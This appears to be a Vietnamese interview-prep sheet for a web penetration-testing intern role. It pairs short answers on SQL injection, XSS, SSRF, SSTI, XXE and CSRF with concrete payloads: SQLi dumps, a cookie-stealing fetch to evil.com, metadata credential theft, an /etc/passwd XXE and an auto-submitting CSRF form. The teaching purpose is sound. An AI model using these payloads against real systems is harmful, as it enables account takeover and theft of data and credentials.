---
title: "tra loi pv chi tiet P1"
---

# Trả lời PV chi tiết P1 - Giới thiệu + Intern + SQLi + XSS + SSRF/SSTI/XXE/CSRF (câu 1-86)

> Mỗi câu: Mẫu ngắn để trả lời + Ví dụ chi tiết có payload, request/response, kết quả để hiểu bản chất.

## 1. Giới thiệu (1-10)
### 1. Giới thiệu 1-2 phút
Mẫu: Em là sinh viên ATTT năm 3, hướng Web/API Pentest, từng intern Web Pentest 7 tháng, final PTIT CTF, luyện PortSwigger/THM.
VD chi tiết: Em mở đầu tên + trường, sau đó nói luôn 3 bằng chứng: (1) Intern test auth/session/access control + viết report cho dev, (2) Final PTIT CTF team Blue_whale phụ trách web, (3) Tự dựng PHP vulnerable web có file-upload để học. Kết bằng mong muốn vào VinSOC học SOC + pentest ISP. Không kể lan man môn học đại cương.

### 2. Tại sao học InfoSec?
Mẫu: Thích tư duy tìm lỗi + hack hợp pháp, web là mặt tiền dễ bị đánh nhất.
VD chi tiết: Kể lần đầu giải CTF web chỉ đổi `?user_id=1305` thành `1000` mà đọc được profile người khác, thấy 1 con số gây lộ data nên quyết theo web thay vì SOC chỉ ngồi xem log.

### 3. Tại sao chọn Web Pentest?
Mẫu: Web/API bề mặt lớn nhất, gần business, impact rõ.
VD chi tiết: So sánh 1 lỗi XSS trên portal 10k user lấy được session admin nguy hiểm hơn 1 lỗi mở port FTP nội bộ ít ai sờ tới, nên em chọn web để thấy tiền/data mất thế nào.

### 11. Công việc hằng ngày Intern?
Mẫu: Nhận scope -> recon -> test checklist OWASP -> log PoC -> report -> retest.
VD chi tiết: Sáng lead giao `staging.shop.vn`, em bật Burp Proxy, click hết chức năng để có sitemap, chiều test login với `admin' OR 1=1-- -`, test API `GET /api/order/1001` đổi sang 1002, tối ghi steps + ảnh request/response vào report.

### 13. Nhận target mới làm gì đầu tiên?
Mẫu: Đọc scope in/out, mapping, xác định tech.
VD chi tiết: Đọc mail scope `*.vinshop.vn, cấm *.core.vn`, chạy subfinder + `ffuf -u https://shop/FUZZ -w common.txt`, mở DevTools xem JS bundle có `/api/v1`, check header `Server: nginx, X-Powered-By: PHP/7.4`, ghi lại hết vào Burp Target.

## 3. SQLi chi tiết (41-53)
### 41. SQLi là gì?
Mẫu: Chèn SQL đổi logic query backend.
VD chi tiết: Login code `SELECT * FROM users WHERE user='$u' AND pass='$p'`. Nhập user `admin' OR '1'='1'-- -`, query thành `WHERE user='admin' OR '1'='1'-- -'`, phần pass bị comment nên luôn đúng, vào được admin không cần pass.

### 42. Vì sao xảy ra?
Mẫu: Ghép chuỗi + không prepared + error verbose + quyền DB cao.
VD chi tiết: PHP `$sql = "SELECT * FROM p WHERE id=".$_GET['id']`. Gửi `?id=1'`, server báo `You have an error in your SQL syntax near ''1'''` -> lộ vị trí inject. Nếu dùng `prepare("...WHERE id=?",[id])` thì `' ` chỉ là chuỗi, không thành code.

### 43. Union-based?
Mẫu: Dùng UNION nối dữ liệu bảng khác vào chỗ hiển thị.
VD chi tiết: `?id=1 ORDER BY 1-- -` tăng dần tới `ORDER BY 4` lỗi -> 3 cột. Gửi `?id=-1 UNION SELECT NULL,username,password FROM users-- -`. Trang hiện list sản phẩm giờ hiện username/pass dòng 2,3. Yêu cầu số cột khớp, dùng NULL dò kiểu.

### 44. Error-based?
Mẫu: Ép DB phun data trong thông báo lỗi.
VD chi tiết: `?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -` MySQL trả `XPATH syntax error: '~5.7.33'`. Thấy version trong lỗi, tương tự lấy `table_name` từ `information_schema`. Chỉ work khi `display_errors=On`.

### 45. Boolean Blind?
Mẫu: Không hiện data, chỉ True/False khác nhau qua content/length.
VD chi tiết: `?id=1 AND 1=1-- -` trả trang 1200 bytes có chữ `Sản phẩm`, `?id=1 AND 1=2-- -` trả 800 bytes mất chữ đó. Khai thác `?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -`, nếu 1200 bytes là đúng, brute từng ký tự bằng Intruder Cluster bomb.

### 46. Time Blind?
Mẫu: True/False cũng giống nhau, dùng sleep đo giờ.
VD chi tiết: `?id=1' AND IF(1=1,SLEEP(5),0)-- -` Burp Repeater mất 5.2s, còn `IF(1=2,SLEEP(5),0)` chỉ 0.3s -> chứng minh inject. Sau đó `IF(SUBSTRING(pass,1,1)='a',SLEEP(5),0)` để brute pass từng char, đúng thì delay.

### 47. Auth bypass?
Mẫu: Biến WHERE luôn đúng, comment phần còn lại.
VD chi tiết: Form user=`admin'-- -`, pass=`xxx`. Query `WHERE user='admin'-- -' AND pass='xxx'` -> sau `-- -` bị bỏ, chỉ còn check user admin, bỏ qua pass. Một số code cũ `OR '1'='1` để cả `user='' OR '1'='1'` luôn true.

### 48. Phát hiện param SQLi?
Mẫu: Thử `' " AND 1=1/1=2` + sleep, so error/length/time.
VD chi tiết: Gửi 3 request Repeater: `id=5` gốc 200 length 1500, `id=5'` 500 SQL syntax, `id=5 AND 1=1` 1500, `id=5 AND 1=2` 900 khác hẳn -> 90% SQLi. Ghi lại để báo cáo.

### 49. Không trả error?
Mẫu: Chuyển blind boolean/time + OOB.
VD chi tiết: Không lỗi thì dùng Comparer so body True/False, nếu giống hệt thì dùng time `SLEEP(5)`. Nặng hơn dùng Collaborator `?id=1'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.xyz.oastify.com\\'))-- -` rồi lên Collaborator xem DNS ping về lấy version.

### 50. Prepared Statement?
Mẫu: Biên dịch query trước với `?`, data gửi sau chỉ là giá trị.
VD chi tiết: `stmt = conn.prepare("SELECT * FROM users WHERE id=?"); stmt.setString(1, userInput);` Dù nhập `' OR 1=1` thì DB tìm id đúng chuỗi đó, không chạy thành logic. Khác ghép `"...id='"+input+"'"`.

### 51. ORM hết SQLi?
Mẫu: Không nếu dùng raw/order từ user.
VD chi tiết: Django `User.objects.filter(id=123)` an toàn, nhưng `User.objects.raw(f"SELECT * FROM u WHERE name='{name}'")` vẫn dính. Hoặc `order_by(request.GET['sort'])` nhập `sort=(CASE WHEN 1=1 THEN name ELSE id END)` vẫn inject vào ORDER BY.

### 52. SQLmap?
Mẫu: Auto fingerprint + test 5 techniques + dump.
VD chi tiết: Chạy `sqlmap -u "https://shop/?id=1" --cookie="sess=abc" --dbs --level=3 --risk=2`. Nó tự thử UNION/Error/Boolean/Time/OOB, hỏi `Payload ... delay 5s ?`, xong `--tables -T users --dump` lấy user/pass. Dùng `--tamper=space2comment` khi gặp WAF.

### 53. Khi nào không dùng SQLmap?
Mẫu: Production sợ DoS, WAF chặn, logic phức tạp, chỉ cần PoC nhẹ.
VD chi tiết: Khách production 10k user, dump full bằng sqlmap gây treo DB, chỉ demo Repeater `AND SLEEP(5)` chứng minh + dừng. Hoặc login có CSRF token mỗi request, sqlmap không tự lấy token mới -> phải manual.

## 4. XSS chi tiết (54-66)
### 54. XSS là gì?
Mẫu: Chèn JS chạy trong browser nạn nhân.
VD chi tiết: Ô comment lưu `<script>fetch('https://evil.com?c='+document.cookie)</script>`. Admin vào xem bài, JS chạy trong origin shop, gửi cookie admin về evil, attacker dùng cookie đó chiếm admin.

### 55. 3 loại?
Mẫu: Reflected cần click link, Stored lưu DB ai xem cũng dính, DOM ở JS client.
VD chi tiết: Reflected `https://shop/search?q=<script>alert(1)</script>` server echo lại, Stored comment lưu DB, DOM code `div.innerHTML = location.hash` nhập `#<img src=x onerror=alert(1)>` không qua server.

### 56. Source Sink?
Mẫu: Source chỗ vào, Sink hàm thực thi.
VD chi tiết: Mở DevTools thấy `var q = new URLSearchParams(location.search).get('q'); document.getElementById('r').innerHTML = q;` -> source `location.search`, sink `innerHTML`, gửi `?q=<img src=x onerror=alert(document.domain)>` là chạy.

### 57. innerHTML nguy hiểm?
Mẫu: Nó parse string thành HTML/JS.
VD chi tiết: `el.innerHTML = userInput`, nhập `<svg onload=alert(1)>` thành tag thật chạy ngay. Fix dùng `textContent`.

### 62. CSP là gì?
Mẫu: Header whitelist nguồn script.
VD chi tiết: Server trả `Content-Security-Policy: script-src 'self' https://cdn.shop.vn`. Browser chặn `<script>alert(1)>` inline + `<script src=https://evil.com/x.js>`, F12 console báo `Refused to execute`.

### 64. Bypass CSP?
Mẫu: Tìm unsafe/whitelist có JSONP/upload.
VD chi tiết: Thấy `script-src 'self' *.googleapis.com`, tìm endpoint `https://cdn.shop.vn/jsonp?callback=alert(1)` của Google trả JS, chèn `<script src="...callback=alert(document.cookie)">` sẽ được CSP cho qua vì đúng domain whitelist.

## 5. SSRF/SSTI/XXE/CSRF (67-86)
### 67. SSRF?
Mẫu: Ép server tự gửi request vào nội bộ.
VD chi tiết: Chức năng `?url=https://shop/avatar?img=...` nhập `?url=http://127.0.0.1:8080/admin`, server fetch và trả về trang admin nội bộ mà ngoài internet không sờ tới.

### 72. Metadata?
Mẫu: Cloud lộ key qua IP đặc biệt.
VD chi tiết: AWS `http://169.254.169.254/latest/meta-data/iam/security-credentials/role`. SSRF `?url=http://169.254.169.254/...` trả `AccessKey: AKIA... Secret...`, dùng key đó `aws s3 ls` chiếm bucket.

### 74. SSTI?
Mẫu: Nhập template thành code server.
VD chi tiết: Ô tên `{{7*7}}` mà trang chào `Hello 49` thay vì `Hello {{7*7}}` -> SSTI. XSS chỉ `alert`, SSTI chạy ở server nên `{{config.__class__...os.popen('id').read()}}` trả `uid=33`.

### 79. XXE?
Mẫu: XML parser đọc entity ngoài.
VD chi tiết: Upload SVG/XML `<?xml ... <!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`, server parse và nhúng nội dung passwd vào ảnh trả về, thấy `root:x:0:...`.

### 83. CSRF?
Mẫu: Dụ browser nạn nhân tự gửi request kèm cookie.
VD chi tiết: Nạn nhân đã login `shop.vn`. Mở trang evil có `<form action="https://shop.vn/change-email" method=POST><input name=email value=evil@a.com></form><script>document.forms[0].submit()</script>`, browser tự kèm cookie session nên email bị đổi thành của attacker.
